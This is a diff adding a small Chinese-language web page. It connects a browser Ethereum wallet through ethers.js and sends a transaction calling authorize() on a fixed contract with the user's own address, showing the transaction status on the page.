@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>ETH 授权 DApp</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <style>
+    body {
+      font-family: Arial;
+      text-align: center;
+      margin-top: 60px;
+      background-color: #121212;
+      color: white;
+    }
+    button {
+      font-size: 18px;
+      padding: 12px 24px;
+      margin: 10px;
+      border-radius: 8px;
+      border: none;
+      background-color: #1e88e5;
+      color: white;
+      cursor: pointer;
+    }
+    button:disabled {
+      background-color: #888;
+      cursor: not-allowed;
+    }
+    #status {
+      margin-top: 20px;
+      color: yellow;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>授权 DApp</h1>
+  <p>请连接钱包后点击授权</p>
+
+  <button id="connectBtn">连接钱包</button>
+  <button id="authorizeBtn" disabled>授权地址</button>
+
+  <p id="status">未连接</p>
+
+  <script>
+    const contractAddress = "0x9ee13fEe17a03082786e5b50520D27c7257AA17f";
+    const abi = [
+      "function authorize(address _addr) public"
+    ];
+
+    let provider = null;
+    let signer = null;
+    let contract = null;
+
+    const statusEl = document.getElementById("status");
+
+    document.getElementById("connectBtn").onclick = async () => {
+      if (!window.ethereum) {
+        statusEl.textContent = "未检测到钱包，请使用钱包内置浏览器打开";
+        return;
+      }
+
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        contract = new ethers.Contract(contractAddress, abi, signer);
+        const address = await signer.getAddress();
+        statusEl.textContent = "已连接钱包地址：" + address;
+        document.getElementById("authorizeBtn").disabled = false;
+      } catch (error) {
+        console.error(error);
+        statusEl.textContent = "连接失败：" + error.message;
+      }
+    };
+
+    document.getElementById("authorizeBtn").onclick = async () => {
+      if (!signer || !contract) {
+        statusEl.textContent = "请先连接钱包";
+        return;
+      }
+
+      try {
+        const address = await signer.getAddress();
+        const tx = await contract.authorize(address);
+        statusEl.textContent = "授权中... 交易哈希: " + tx.hash;
+        await tx.wait();
+        statusEl.textContent = "授权成功 ✅";
+      } catch (error) {
+        console.error(error);
+        statusEl.textContent = "授权失败：" + error.message;
+      }
+    };
+  </script>
+
+</body>
+</html>
